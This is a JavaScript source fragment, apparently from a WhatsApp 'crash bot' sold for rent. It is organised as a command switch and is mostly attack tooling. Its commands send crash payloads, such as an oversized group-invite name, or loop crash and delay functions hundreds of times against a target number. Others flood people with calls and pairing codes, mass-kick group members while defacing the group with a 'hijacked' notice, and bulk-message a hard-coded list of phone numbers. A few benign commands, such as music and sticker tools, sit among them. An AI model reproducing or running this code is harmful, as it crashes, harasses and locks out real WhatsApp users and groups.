                isVideo: true,
                participants: [{
                    jid: '5521992999999@s.whatsapp.net',
                    callOutcome: '1'
                }]
            }
        }
    }
});
}
await fcgrubNomorBrasil(m.chat)
break
case 'xblackdelay': {
//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 300; i++) {
await protocolbug7(Xreturn);
}
}
break
case 'null': {
//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "201126699326") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "201142328699") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("رقم مش موجود في وتس");
  }
  
  sendMessageWithMentions(
    "*Success Send BUG 🐛 👁️*", 
    [Xreturn]
  );
		for (let i = 0; i < 18; i++) {
  
     await sleep(200)
     await crashnotag(Xreturn)
     await crashnewhx(DevNexusX, Xreturn)
     await sleep(200)
   
     await crashnotag(Xreturn)
     await sleep(200)
     await crashnewhx(DevNexusX, Xreturn)
   }
		}
		break
	
	case 'reactch': {
    if (!q) {
        return replygcxeon(`Usage: ${prefix}reactch link_channel text\nFor example: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20/18383 hello`);}
    if (!q.startsWith("https://whatsapp.com/channel/")) {
        return replygcxeon("Link invalid!");}
    const xeonReaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒' };
    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return xeonReaction[c] || c;
    }).join('');
    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];
        const res = await DevNexusX.newsletterMetadata("invite", channelId);
        await DevNexusX.newsletterReactMessage(res.id, messageId, emoji);
        return replygcxeon(`Sent reaction *${emoji}* for the message in the channel *${res.name}.*`);
    } catch (e) {
        console.error(e);
        return replygcxeon("Failed to send reaction. Please make sure the link and emoji are valid.");
    }}
break;

		case 'xxioxs': case 'xxxiosbrutalityxx': {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 300; i++) {
     await xoutios(Xreturn)
   }
		}
		break
		
		case 'xbrutality2xxx': {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 999; i++) {
     await xeonOutBrutal2(Xreturn)
   }
		}
		break
		
		case 'delay': {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "201126699326") {
    return;
    }
    if (victim == "201206738488") {
    return;
    }
    if (victim == "201117932231") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "*Success Send Delay Net🐛👁️*", 
    [Xreturn]
  );
		for (let i = 0; i < 99; i++) {
     await delaynullD(Xreturn)
     await hxdelay(Xreturn, DevNexusX)
     await hxdelay(Xreturn, DevNexusX)
     await sleep (100)
     await delayNull(Xreturn)
     await sleep (1100)
     await NullInvis(Xreturn)
     await delaynullD(Xreturn)
     await sleep (100)
     await HDelay(Xreturn)
     
   }
		}
		break
	
	case "checkchid": case "idch": {
		//
    if (!text) return replygcxeon(`Provide channel link\nExample: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20 `)
    if (!text.includes("https://whatsapp.com/channel/")) return replygcxeon("Invalid link")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await DevNexusX.newsletterMetadata("invite", result)
        if (!res) return replygcxeon("Failed to fetch information of this channel")
        let teks = `
*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Not Verified"}
        `
        return replygcxeon(teks)
    } catch (error) {
        console.error(error);
        return replygcxeon("An error occurred while retrieving metadata");
    }
}
break
	case 'gg': {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 3; i++) {
     await gg6(Xreturn)
   }
		}
		break
		
		case 'dxxxinvi2': {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
await sendMessagesForDurationX(1, Xreturn);
		}
		break
	
	case 'searchpair': {
    if (!global.banner.includes(senderNumber)) {
        return;
    }

    // Ensure the user provides a number to search
    if (!args[0]) {
        return replygcxeon("❌ Please provide a number to search. Example: *searchpair 919402104403*");
    }

    const searchNumber = args[0] + '@s.whatsapp.net'; // Convert input to JID format
    const pairingPath = './lib2/pairing';

    try {
        // Check if the pairing directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name); // Keep full JID format

        // Check if the searched number exists
        if (pairedDevices.includes(searchNumber)) {
            return replygcxeon(`✅ The number *${args[0]}* is paired.`);
        } else {
            return replygcxeon(`❌ The number *${args[0]}* is not paired.`);
        }
    } catch (err) {
        console.error('Error searching paired devices:', err);
        return replygcxeon('Failed to search paired devices data.');
    }
}
break;

case 'xxxban': case 'xnxx1': {
	// Check if botNumber or sender is in global.banner
    if (global.banner.includes(botNumber) || !global.banner.includes(senderNumber)) {
        return;
    }
    try {
        const fs = require('fs');
        const axios = require('axios');
        const path = require('path');

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        const imageUrl = "https://raw.githubusercontent.com/dgxeon13/xeonPloitWa/refs/heads/main/photo_2024-12-19_01-39-48.jpg";
        const imagePath = path.join(__dirname, 'temp_profile.jpg');

        (async () => {
            // Download the image
            let response = await axios({ url: imageUrl, responseType: 'arraybuffer' });
            fs.writeFileSync(imagePath, Buffer.from(response.data, 'binary'));

            // Change bot's profile picture
            await DevNexusX.updateProfilePicture(DevNexusX.user.id.split(':')[0] + "@s.whatsapp.net", { url: imagePath });

            // Fetch all groups
            let allGroups = Object.values(await DevNexusX.groupFetchAllParticipating().catch(() => []));
            let groupIds = allGroups.map(group => group.id);

            // Filter out blacklisted groups
            let blacklistedGroups = [];
            try {
                blacklistedGroups = JSON.parse(fs.readFileSync('./database/idgroup.json', "utf8"));
            } catch (err) {
                console.error("⚠️ No blacklist file found, continuing...");
            }

            let targetGroups = groupIds.filter(id => !blacklistedGroups.includes(id));

            // Update profile pictures in each group
            for (let groupId of targetGroups) {
                try {
                    await DevNexusX.updateProfilePicture(groupId, { url: imagePath });
                    console.log(`✅ Updated profile picture for ${groupId}`);
                } catch (err) {
                    console.error(`❌ Error updating profile picture for ${groupId}:`, err);
                }
                await delay(1000); // Wait 1 second between updates
            }

            // Clean up & send message
            fs.unlinkSync(imagePath);
        })();
    } catch (error) {
        console.error("❌ Detailed Error:", error);
    }
}
break;
	
case 'prombgoteall': {
	//
    if (!m.isGroup) return replygcxeon("الأمر ده مينفعش غير جوا الجروبات بس يا معلم 📣");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available for promotion.");

    try {
        await DevNexusX.groupParticipantsUpdate(from, xeon_collect_members, 'promote');
        await replygcxeon("Successfully promoted all members!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while promoting members.");
    }
}
break;

case 'demhjoteall': {
	//
    if (!m.isGroup) return replygcxeon("الأمر ده مينفعش غير جوا الجروبات بس يا معلم 📣");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin !== null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No admins available for demotion.");

    try {
        await DevNexusX.groupParticipantsUpdate(from, xeon_collect_members, 'demote');
        await replygcxeon("Successfully demoted all admins!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while demoting members.");
    }
}
break;

case 'kickall': case 'hack': case 'hijack': case 'nuke': {
	//
    if (!m.isGroup) return replygcxeon("الأمر ده مينفعش غير جوا الجروبات بس يا معلم 📣");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available to kick.");

    try {
        await DevNexusX.groupUpdateDescription(from, '\n\n\nGROUP HIJACKED BY Telegram: @F_1KE\n\n\n');
        await sleep(100);
        await DevNexusX.groupUpdateSubject(from, '\u0000'); 
        replygcxeon(`\n\n\n\n\n\n\n\n\n\n\n\nGroup Hacked by Telegram: @F_1KE\n\n\n\n\n\n\n\n\n\n\n\n`);
        await sleep(100);
        await DevNexusX.groupParticipantsUpdate(from, xeon_collect_members, 'remove');
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while kicking members.");
    }
}
break;

	case 'crashgroup': {
    //;
    if (!q) return replygcxeon(`🔹 مثال على الاستخدام:
${prefix + command} 120363047626537xxx@g.us

📌 عايز تجيب آي دي الجروب؟
اكتب الأمر: .listgc

📌 ولو معاك لينك الجروب وعايز تطلع منه الآي دي؟
اكتب كده: .group-id لينك_الجروب`);

    // Check if input contains a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("آي دي الجروب لازم يكون رقم، مش لينك.لو معاك لينك وعايز تطلع منه الآي دي، استخدم الأمر:.group-id <لينك_الجروب>");
    }

    // Extract group ID and amount from input
    let input = q.split("|");
    let victimxd = input[0].trim(); // Group ID
    let loopCount2 = parseInt(input[1]); // Extract amount

    // Validate Group ID format (only numbers + "@g.us")
    if (!/^\d+@g\.us$/.test(victimxd)) {
        return replygcxeon("Invalid group ID! Please enter a correct WhatsApp group ID.");
    }

    // Validate loop count
    if (isNaN(loopCount2) || loopCount2 < 1) {
        loopCount2 = 5; // Default to 5 if amount is invalid
    }

    replygcxeon(`*Success Send BUG  a group🐛 👁️*`);

    for (let i = 0; i < loopCount2; i++) {
        await sleep(1050);

        const nulltnt = "ཹ".repeat(65000);
        const repetirNull = nulltnt.repeat(2);

        if (!isBot) return;

        try {
            await DevNexusX.relayMessage(
                victimxd, // ✅ الجروب الهدف
                {
                    groupInviteMessage: {
                        groupName: repetirNull,
                        groupJid: victimxd, // ✅ نفس الجروب
                        inviteCode: 'h+64P9RhJDzgXSPf',
                        inviteExpiration: '999',
                        caption: '',
                        thumbnail: null,
                        contextInfo: {}
                    }
                },
                {}
            );
        } catch (e) {
            console.log('Error sending:', e);
        }
    }

    replygcxeon(`✅ تم الانتهاء بنجاح
⚡ DevNexusX ⚡`);
}
    break;

	
	case 'forceblock':
	//;
    // Get user input for loop count
    let loopCount = parseInt(args[0]);
    if (isNaN(loopCount) || loopCount < 1) {
        loopCount = 5; // Default value if input is invalid
    }
    
    for (let i = 0; i < loopCount; i++) {
        await sleep(1050);
        await DevNexusX.relayMessage(from, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

case 'listjjpair': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @DGXeon
Telegram: @F_1KE
WhatsApp: +916909137213`);
}

        const pairingPath = './lib2/pairing';

    try {
        // Check if the directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => `+${entry.name.replace('@s.whatsapp.net', '')}`); // Add '+' before number

        // Handle if no paired devices are found
        if (pairedDevices.length === 0) {
            return replygcxeon('No paired devices found.');
        }

        // Count total paired devices
        const totalUsers = pairedDevices.length;

        // Format the list of paired devices for the response
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        replygcxeon(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return replygcxeon('Failed to load paired devices data.');
    }
}
break;

case 'شغل': {
  try {
    const yts = require('yt-search');

    const tempDir = path.join(__dirname, 'temp');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    if (!args.length)
      return replygcxeon(`🎵 اكتب اسم الأغنية!\nمثال: ${prefix}play Not Like Us`);

    const query = args.join(' ').trim();
    if (query.length > 200)
      return replygcxeon('📝 اسم الأغنية طويل جدًا!');

    // إبلاغ المستخدم
    await replygcxeon('🎧 جاري البحث عن الأغنية، انتظر قليلًا... ⏳');

    // البحث في يوتيوب
    const search = await yts(`${query} official`);
    const video = search?.videos?.[0];
    if (!video)
      return replygcxeon('😕 لم أجد هذه الأغنية، جرب اسمًا آخر.');

    // API التحميل
    const apiUrl = `https://api.privatezia.biz.id/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`;
    const apiRes = await axios.get(apiUrl, { timeout: 20000 });

    const apiData = apiRes.data;
    if (!apiData?.status || !apiData?.result?.downloadUrl)
      return replygcxeon('❌ فشل جلب رابط التحميل.');

    // اسم ملف آمن
    const timestamp = Date.now();
    const safeTitle = (apiData.result.title || video.title || 'audio')
      .replace(/[\\\/:*?"<>|]/g, '')
      .slice(0, 120);

    const filePath = path.join(tempDir, `audio_${timestamp}.mp3`);

    // تحميل الصوت
    const audioResponse = await axios({
      method: 'get',
      url: apiData.result.downloadUrl,
      responseType: 'stream',
      timeout: 600000
    });

    const writer = fs.createWriteStream(filePath);
    audioResponse.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
    });

    if (!fs.existsSync(filePath) || fs.statSync(filePath).size === 0) {
      if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
      return replygcxeon('❌ فشل تحميل الصوت.');
    }

    // رسالة معلومات
    await DevNexusX.sendMessage(
      m.chat,
      { text: `🎶 يتم التشغيل الآن:\n*${safeTitle}*\n🔗 ${video.url}` },
      { quoted: m }
    );

    // إرسال الصوت
    await DevNexusX.sendMessage(
      m.chat,
      {
        audio: fs.readFileSync(filePath),
        mimetype: 'audio/mpeg',
        fileName: `${safeTitle}.mp3`
      },
      { quoted: m }
    );

    // تنظيف
    fs.unlinkSync(filePath);

  } catch (error) {
    console.log('Play error:', error);
    replygcxeon(`💥 خطأ أثناء التشغيل`);
  }
}
break;

case 're12qpair':
// Check system storage and RAM
    const freeStorage = os.freemem() / (1024 * 1024); // Free memory in MB
    const totalStorage = os.totalmem() / (1024 * 1024); // Total memory in MB
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024); // Free disk space in MB

    if (freeStorage < 300 || freeDiskSpace < 300) { // Set a threshold of 100 MB for storage and RAM
        return replygcxeon('Slot is full, please try again later.');
    }

//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  // Extract and validate the country code or prefix
const countryCode = text.slice(0, 3); // Extract the first 3 digits for country code
const prefixxx = text.slice(0, 1); // Extract the first digit for prefix
const firstTwoDigits = text.slice(0, 2); // Extract the first two digits to check for "89"

// Function to validate if a number is a valid WhatsApp number
const isValidWhatsAppNumber = (number) => {
    return number.length >= 10 && number.length <= 15 && !isNaN(number);
};

if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
    return replygcxeon("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
}

if (!isValidWhatsAppNumber(text)) {
    return replygcxeon("Invalid WhatsApp number. Please enter a valid number.");
}


    // Proceed with pairing
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    await replygcxeon(`${cuObj.code}`);

break;

case 'spamcall':{
	//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXXXXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "201104394429") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "91942301") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  async function sendOfferCall(target) {
    try {
        await DevNexusX.offerCall(target);
        /*console.log(chalk.white.bold(`Success Send Offer Call To Target`));*/
    } catch (error) {
        /*console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));*/
    }
}

  sendMessageWithMentions(
    "*انت بترخم علي ضحيه ماشي يا عم بعتنا ٧ مكالمات* ", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 7; i++) {
await sendOfferCall(Xreturn)
await sleep(2000)
}
  }
break
	case 'xgroup':
	//
	if (!q) return replygcxeon(`🔹 مثال على الاستخدام:
${prefix + command} 120363047626537xxx@g.us

📌 عايز تجيب آي دي الجروب؟
اكتب الأمر: .listgc

📌 ولو معاك لينك الجروب وعايز تطلع منه الآي دي؟
اكتب كده: .group-id لينك_الجروب`)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("آي دي الجروب لازم يكون رقم، مش لينك.لو معاك لينك وعايز تطلع منه الآي دي، استخدم الأمر:.group-id <لينك_الجروب>");
    }
victim = text.split("|")[0]

async function groupxeony(target) {
  await DevNexusX.relayMessage(target, carousel.message, { quoted: carousel.key.id });

            await DevNexusX.sendMessage(target, {
                location: {
                    degreesLatitude: 'Telegram: @F_1KE',
                    degreesLongitude: 'Telegram: @F_1KE',
                    name: `Telegram: @F_1KE`,
                    url: bugUrl,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        isLiveLocation: true,
                        fromMe: false,
                        participant: '0@s.whatsapp.net',
                        remoteJid: sender,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                title: "crash",
                                pageCount: 1000000000,
                                fileName: "crash.pdf",
                                contactVcard: true
                            }
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363386423395618@newsletter',
                            serverMessageId: 1,
                            newsletterName: " " + bug + bug
                        },
                        externalAdReply: {
                            title: ' Telegram: @F_1KE ',
                            body: 'Telegram: @F_1KE',
                            mediaType: 0,
                            thumbnail: m,
                            jpegThumbnail: m,
                            mediaUrl: `https://www.youtube.com/@%E3%83%85JOALHAKEM`,
                            sourceUrl: `https://www.youtube.com/@%E3%83%85JOALHAKEM`
                        }
                    }
                }
            });
  }
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 300; i++) {
	await groupxeony(victim);
    }
break
                case 'group-id': {
    //
    if (!text) return replygcxeon('حط لينك يا عم متقرفناش');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!');

    const result = args[0].split('https://chat.whatsapp.com/')[1];

    try {
        const xeontry = await DevNexusX.groupAcceptInvite(result);
        
        if (!xeontry) {
            return replygcxeon('يا باشا، يا إما الجروب محتاج موافقة عشان تدخل، يا إما اتطردت منه، يا إما لينك الدعوة خلص ومبقاش شغال. جرب تدخل الجروب الأول وبعدين استخدم الأمر .listgc');
        }

        replygcxeon(`Group ID: ${xeontry}`);
    } catch (error) {
        replygcxeon('يا باشا، يا إما الجروب محتاج موافقة عشان تدخل، يا إما اتطردت منه، يا إما لينك الدعوة خلص ومبقاش شغال. جرب تدخل الجروب الأول وبعدين استخدم الأمر .listgc');
    }
}
break;

case 'outo_status':
    case 'autostatusview':{
    	//
               if (args[0] === 'on') {
                  db.data.settings[botNumber].antiswview = true
                  replygcxeon(`Successfully ${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].antiswview = false
                  replygcxeon(`Successfully ${command} is disabled`)
               } else {
                	replygcxeon(`Please select on/off\n\Example: ${prefix+command} on`)
            }
            }
            break
            
            case 'totag': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
				delete m.quoted.chat
				await DevNexusX.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
			
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				DevNexusX.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
			}
			break
			
			case 'sendtoall': {
    if (!q) return replygcxeon(`اكتب الرسالة يا معلم:\nمثال:\n.sendtoall مرحبا`);

    let userMsg = args.join(" ");

    // قائمة الأرقام
    let numbersList = [
    "201098792741",
    "201157144108",
    "201025169144",
    "201020164774",
    "201143486249",
    "201142328699",
    "201040024884",
    "201289220781",
    "201144617179",
    "201068230760",
    "96878746743",
    "96878650526",
    "201080224296",
    "201006705655",
    "201557556068",
    "201015766876"
];

    replygcxeon(`🔰 جاري إرسال الرسالة إلى *${numbersList.length}* رقم ...`);

    for (let num of numbersList) {
        try {
            let jid = num + "@s.whatsapp.net";

            // الرسالة النهائية — المنشن لازم يكون رقم فقط
            let finalMessage = `سلام عليكم عامل/ـه اي يا@${num}\n${userMsg}`;

            await DevNexusX.sendMessage(jid, {
                text: finalMessage,
                mentions: [jid] // علشان الواتس يظهر المنشن باللون الأخضر
            });

            console.log("تم الإرسال إلى:", jid);

        } catch (e) {
            console.log("خطأ عند الإرسال:", e);
        }
    }

    reply(`✅ تم الإرسال لكل الأرقام بنجاح.`);
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
DevNexusX.downloadAndSaveMediaMessage(quoted, "gifee")
DevNexusX.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await DevNexusX.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await DevNexusX.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break

case 'menu':
            case 'help':
            case 'alive':
            case '?':
            case 'allmenu':{          	
            //
            	const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const xeonmenuoh = `⚠️ *HX SYSTEM MENU* ⚠️

☠️ *CRASH*
» fc
» fc1
» iosCrash 
» ios_invis
» Delay
» null (*CRASH 1Msg*)

📡 *INFO*
» device 
» idch
» group-id 
» Listgc

⚙️ *TOOLS*
» spampair
» clearchat
» crashgroup
» Forceblock (soon)
» outo_status

🧿 *PHOTO NULL*
» com`
DevNexusX.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/Cheems-bot.mp4'),
caption: xeonmenuoh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/l95ssx.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})

}
break;
case 'spampair': {
	//
			if (!q) return replygcxeon(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@adiwajshing/baileys')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 replygcxeon(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				/*await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)*/
			}
			await sleep(15000)
			}
		break
case 'dhodos':{
	//
